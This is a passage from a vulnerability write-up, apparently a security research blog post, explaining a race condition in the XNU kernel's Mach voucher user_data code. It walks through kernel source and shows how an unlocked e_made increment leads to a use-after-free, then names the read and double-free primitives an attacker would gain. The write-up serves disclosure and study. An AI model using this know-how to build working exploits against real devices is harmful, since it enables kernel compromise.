 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>and returned early from </span><span class="BGLtzooHlW-c11">ivace_release</span><span>, despite having dropped </span><span class="BGLtzooHlW-c11">ivace_refs</span><span>&nbsp;to zero, and it&#39;s now this thread&#39;s responsibility to continue freeing this </span><span class="BGLtzooHlW-c11">ivace</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.695f8a6ea5856759df1540506f4e25734c86a633"></a><a id="t.52"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">goto</span><span class="BGLtzooHlW-c4">&nbsp;redrive</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>You can see the location of the </span><span class="BGLtzooHlW-c11">redrive</span><span>&nbsp;label in the earlier snippets; it captures a new value from </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;before calling out to the attr manager again to try to free the </span><span class="BGLtzooHlW-c11">ivace_value</span><span class="BGLtzooHlW-c10">.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>If we don&#39;t </span><span class="BGLtzooHlW-c11">goto redrive</span><span>&nbsp;then this </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;has been revived and is still alive, therefore all that needs to be done is set </span><span class="BGLtzooHlW-c11">ivace_releasing</span><span>&nbsp;to </span><span class="BGLtzooHlW-c11">FALSE</span><span class="BGLtzooHlW-c10">&nbsp;and return.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The conditions under which the other branch is taken is nicely documented in a comment. This is the case when </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;is equal to </span><span class="BGLtzooHlW-c11">made</span><span>, yet </span><span class="BGLtzooHlW-c11">ivam_release_value</span><span>&nbsp;didn&#39;t return success (so the </span><span class="BGLtzooHlW-c11">ivace_value</span><span class="BGLtzooHlW-c10">&nbsp;wasn&#39;t freed.)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.5eb97c3d310b04e72ad54169750ec70dff549ca6"></a><a id="t.53"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* If the manager returned FAILURE, someone took a</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* reference on the value but have not updated the ivace,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* release the lock and return since thread who got</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* the new reference will update the ivace and will have</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* non-zero reference on the value.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>In this case, the code again just sets </span><span class="BGLtzooHlW-c11">ivace_releasing</span><span>&nbsp;to </span><span class="BGLtzooHlW-c11">FALSE</span><span class="BGLtzooHlW-c10">&nbsp;and continues.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Put another way, this comment explaining is exactly what happens when the racing thread was exactly in the region marked </span><span class="BGLtzooHlW-c23">WINDOW</span><span>&nbsp;up above, which is after that thread had incremented </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;on the same </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;which this </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;has a pointer to in its </span><span class="BGLtzooHlW-c11">ivace_value</span><span>&nbsp;field, but before that thread had looked up this </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;and taken a reference. That&#39;s exactly the window another thread needs to hit where it&#39;s not correct for this thread to free its </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>, despite our </span><span class="BGLtzooHlW-c11">ivace_refs</span><span class="BGLtzooHlW-c10">&nbsp;being 0.</span></p><h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.9t2rft5xjjjf"><span class="BGLtzooHlW-c20">The bug</span></h2>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Hopefully the significance of the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;</span><span class="BGLtzooHlW-c11">e_made</span><span class="BGLtzooHlW-c10">&nbsp;field is now clear. It&#39;s not exactly a reference count; in fact it only exists as a kind of band-aid to work around what should be in practice a very rare race condition. But, if its value was wrong, bad things could happen if you tried :)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;is only modified in two places: Firstly, in </span><span class="BGLtzooHlW-c11">user_data_dedup</span><span>&nbsp;when a matching </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;is found in the </span><span class="BGLtzooHlW-c11">user_data_bucket</span><span class="BGLtzooHlW-c10">&nbsp;hash table:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.484d8847b8af9875d2025d95cd2485b68892c7b1"></a><a id="t.54"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* ... we found a match... */</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made</span><span class="BGLtzooHlW-c2">++;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; user_data_unlock</span><span class="BGLtzooHlW-c2">();</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The only other place is in </span><span class="BGLtzooHlW-c11">user_data_get_value</span><span>&nbsp;when handling the </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REDEEM</span><span class="BGLtzooHlW-c10">&nbsp;command during recipe parsing:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.3c0876f1c62007cdc6321660fe4a6fcf553a111c"></a><a id="t.55"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">switch</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">command</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">case</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_REDEEM</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* redeem of previous values is the value */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;prev_value_count</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">user_data_element_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">prev_values</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made</span><span class="BGLtzooHlW-c2">++;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;prev_values</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* redeem of default is default */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>As mentioned before, it&#39;s up to the attr managers themselves to define the semantics of redeeming a voucher; the entirety of the user_data semantics for voucher redemption are shown above. It simply returns the previous value, with </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;incremented by 1. Recall that </span><span class="BGLtzooHlW-c11">*prev_value</span><span>&nbsp;is either the value which was previously in this under-construction voucher for this key, or the value in the </span><span class="BGLtzooHlW-c11">prev_voucher</span><span class="BGLtzooHlW-c10">&nbsp;referenced by this sub-recipe.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>If you can&#39;t spot the bug above in the </span><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;</span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REDEEM</span><span>&nbsp;code right away that&#39;s because it&#39;s a bug of omission; it&#39;s what&#39;s </span><span class="BGLtzooHlW-c17">not</span><span>&nbsp;there that causes the vulnerability, namely that the increment in the </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REDEEM</span><span>&nbsp;case isn&#39;t protected by the </span><span class="BGLtzooHlW-c11">user_data</span><span class="BGLtzooHlW-c10">&nbsp;lock! This increment isn&#39;t atomic.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>That means that if the </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REDEEM</span><span>&nbsp;code executes in parallel with either itself on another thread or the </span><span class="BGLtzooHlW-c11">elem-&gt;e_made++</span><span>&nbsp;increment in </span><span class="BGLtzooHlW-c11">user_data_dedup</span><span>&nbsp;on another thread, the two threads can both see the same initial value for </span><span class="BGLtzooHlW-c11">e_made</span><span class="BGLtzooHlW-c10">, both add one then both write the same value back; incrementing it by one when it should have been incremented by two.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>But remember, </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;isn&#39;t a reference count! So actually making something bad happen isn&#39;t as simple as just getting the two threads to align such that their increments overlap so that </span><span class="BGLtzooHlW-c11">e_made</span><span class="BGLtzooHlW-c10">&nbsp;is wrong.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s think back to what the purpose of </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;is: it exists solely to ensure that if thread A drops the last ref on an </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;whilst thread B is exactly in the race window shown below, that thread</span><span>&nbsp;</span><span>doesn&#39;t free </span><span class="BGLtzooHlW-c11">new_value</span><span class="BGLtzooHlW-c10">&nbsp;on thread B&#39;s stack:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.6678b43a7a459c004d346e8b4b835a591c986cfd"></a><a id="t.56"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivam_get_value</span><span class="BGLtzooHlW-c2">)(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivam</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; previous_vals</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;previous_vals_count</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_flag</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_value_voucher</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_release</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">...</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c7">/* WINDOW */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; val_index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace_reference_by_value</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;new_value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;new_flag</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>And the reason the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;doesn&#39;t get freed by thread A is because in that window, </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;will always be </span><span class="BGLtzooHlW-c17">larger</span><span>&nbsp;than the </span><span class="BGLtzooHlW-c11">ivace-&gt;ivace_made</span><span>&nbsp;value for any </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;which has a pointer to that </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>. </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;is larger because the </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;increment always happens </span><span class="BGLtzooHlW-c17">before</span><span>&nbsp;any </span><span class="BGLtzooHlW-c11">ivace_made</span><span class="BGLtzooHlW-c10">&nbsp;increment.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>This is why the absolute value of </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;isn&#39;t important; all that matters is whether or not it&#39;s equal to </span><span class="BGLtzooHlW-c11">ivace_made</span><span class="BGLtzooHlW-c10">. And the only purpose of that is to determine whether there&#39;s another thread in that window shown above.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>So how can we make something bad happen? Well, let&#39;s assume that we successfully trigger the </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;non-atomic increment and end up with a value of </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;which is one less than </span><span class="BGLtzooHlW-c11">ivace_made</span><span>. What does this do to the race window detection logic? It completely flips it! If, in the steady-state </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;is one less than </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;then we race two threads; thread A which is dropping the last </span><span class="BGLtzooHlW-c11">ivace_ref</span><span>&nbsp;and thread B which is attempting to revive it and thread B is in the </span><span class="BGLtzooHlW-c23">WINDOW</span><span>&nbsp;shown above then </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;gets incremented before </span><span class="BGLtzooHlW-c11">ivace_made</span><span>, but since </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;started out one </span><span class="BGLtzooHlW-c17">lower</span><span>&nbsp;than </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;(due to the successful earlier trigger of the non-atomic increment) then </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;is now exactly </span><span class="BGLtzooHlW-c17">equal</span><span>&nbsp;to </span><span class="BGLtzooHlW-c11">ivace_made</span><span>; the exact condition which indicates we cannot possibly be in the </span><span class="BGLtzooHlW-c23">WINDOW</span><span>&nbsp;shown above, and it&#39;s safe to free the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span class="BGLtzooHlW-c10">&nbsp;which is in fact live on thread B&#39;s stack!</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Thread B then ends up with a revived </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;with a dangling </span><span class="BGLtzooHlW-c11">ivace_value</span><span class="BGLtzooHlW-c10">.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>This gives an attacker two primitives that together would be more than sufficient to successfully exploit this bug: the </span><span class="BGLtzooHlW-c11">mach_voucher_extract_attr_content</span><span>&nbsp;voucher port MIG method would allow reading memory through the dangling </span><span class="BGLtzooHlW-c11">ivace_value</span><span>&nbsp;pointer, and deallocating the voucher port would allow a controlled extra </span><span class="BGLtzooHlW-c11">kfree</span><span class="BGLtzooHlW-c10">&nbsp;of the dangling pointer.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
